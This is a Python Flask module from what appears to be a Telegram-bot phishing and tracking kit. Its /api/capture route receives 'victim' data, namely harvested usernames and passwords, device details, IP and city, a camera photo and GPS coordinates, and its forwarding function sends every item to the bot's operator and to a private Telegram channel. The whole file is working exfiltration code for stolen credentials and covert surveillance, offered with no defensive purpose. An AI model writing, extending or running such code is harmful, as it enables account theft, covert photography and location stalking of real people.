import base64
import os
import threading
from flask import request, jsonify
from bot.config import BOT_TOKEN, PRIVATE_CHANNEL_ID
from bot.utils.storage import victim_data_store, link_cache

def forward_to_user_and_channel(victim_id, data):
    """Forward victim data to user + channel"""
    try:
        from bot.__init__ import bot
        
        # Find user_id
        user_id = None
        for key, val in link_cache.items():
            if str(val.get("user_id")) == str(victim_id):
                user_id = val["user_id"]
                break
        
        if not user_id:
            for key in victim_data_store:
                if key.startswith("photo_") and key.endswith(str(victim_id)):
                    user_id = key.replace("photo_", "")
                    break
                elif key.startswith("redirect_") and key.endswith(str(victim_id)):
                    user_id = key.replace("redirect_", "")
                    break
        
        if not user_id:
            print(f"⚠️ No user found for victim {victim_id}")
            return
        
        # Prepare data
        user_text = f"📥 *Victim Data*\n🆔 {victim_id}\n"
        device = data.get('device_info', {})
        if device:
            user_text += f"📱 {device.get('userAgent', 'N/A')[:50]}...\n"
            user_text += f"🔋 {device.get('battery', 'N/A')}\n📶 {device.get('network', 'N/A')}\n"
        user_text += f"🌐 IP: {data.get('ip', 'Unknown')}\n📍 City: {data.get('city', 'Unknown')}\n"
        
        creds = data.get('creds')
        if creds:
            user_text += f"🔑 {creds.get('platform')}: {creds.get('username')} / {creds.get('password')}\n"
        
        # Send to user
        bot.send_message(user_id, user_text, parse_mode="Markdown")
        
        # Send photo to user
        photo_data = data.get('photo')
        if photo_data and photo_data.startswith('data:image'):
            try:
                b64 = photo_data.split(',')[1]
                with open('temp_user.jpg', 'wb') as f:
                    f.write(base64.b64decode(b64))
                with open('temp_user.jpg', 'rb') as f:
                    bot.send_photo(user_id, f)
                os.remove('temp_user.jpg')
            except Exception as e:
                print(f"User photo error: {e}")
        
        # Send location to user
        loc = data.get('location')
        if loc and loc.get('lat') and loc.get('lng'):
            bot.send_location(user_id, loc['lat'], loc['lng'])
        
        # Send to channel
        channel_text = f"📥 *New Victim Data*\n🆔 {victim_id}\n"
        if device:
            channel_text += f"📱 {device.get('userAgent', 'N/A')[:50]}...\n"
            channel_text += f"🔋 {device.get('battery', 'N/A')}\n📶 {device.get('network', 'N/A')}\n"
        channel_text += f"🌐 IP: {data.get('ip', 'Unknown')}\n📍 City: {data.get('city', 'Unknown')}\n"
        if creds:
            channel_text += f"🔑 {creds.get('platform')}: {creds.get('username')} / {creds.get('password')}\n"
        
        bot.send_message(PRIVATE_CHANNEL_ID, channel_text, parse_mode="Markdown")
        
        # Send photo to channel
        if photo_data and photo_data.startswith('data:image'):
            try:
                b64 = photo_data.split(',')[1]
                with open('temp_channel.jpg', 'wb') as f:
                    f.write(base64.b64decode(b64))
                with open('temp_channel.jpg', 'rb') as f:
                    bot.send_photo(PRIVATE_CHANNEL_ID, f)
                os.remove('temp_channel.jpg')
            except Exception as e:
                print(f"Channel photo error: {e}")
        
        # Send location to channel
        if loc and loc.get('lat') and loc.get('lng'):
            bot.send_location(PRIVATE_CHANNEL_ID, loc['lat'], loc['lng'])
        
        print(f"✅ Data forwarded to user {user_id} and channel")
        
    except Exception as e:
        print(f"Forward error: {e}")

def create_capture_route(target_type):
    """Factory function to create /api/capture route for specific type"""
    def capture():
        data = request.json
        if not data:
            return jsonify({"status": "error"}), 400
        
        victim_id = data.get('victim_id')
        if not victim_id:
            return jsonify({"status": "error"}), 400
        
        victim_data_store[f"victim_{victim_id}"] = data
        threading.Thread(target=forward_to_user_and_channel, args=(victim_id, data)).start()
        return jsonify({"status": "ok"})
    return capture
